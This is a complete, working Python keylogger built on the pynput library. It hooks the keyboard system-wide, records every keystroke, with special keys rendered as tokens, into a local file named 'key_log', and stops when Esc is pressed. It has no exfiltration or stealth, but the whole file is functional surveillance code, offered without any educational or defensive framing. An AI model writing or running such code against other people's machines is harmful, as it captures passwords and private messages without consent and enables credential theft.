from pynput import keyboard

class KeyLog:
    def __init__(self):
        self.special_keys = {
            keyboard.Key.enter     : "\n",
            keyboard.Key.space     : " ",
            keyboard.Key.shift     : "<shift>",
            keyboard.Key.backspace : "<backspace>\n",
            keyboard.Key.ctrl_l    : "<ctrl>\n",
            keyboard.Key.ctrl_r    : "<ctrl>\n"
        }

    def handle_key(self, key):
        try:
            return key.char
        except AttributeError:
            return self.special_keys.get(key, f"{key}")

    def on_press(self, key):
        key_str = self.handle_key(key)
        if key_str is not None:
            with open("key_log", "a") as f:
                f.write(key_str)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def start_listen(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

def main():
    keylogger = KeyLog()
    keylogger.start_listen()

if __name__ == "__main__":
    main()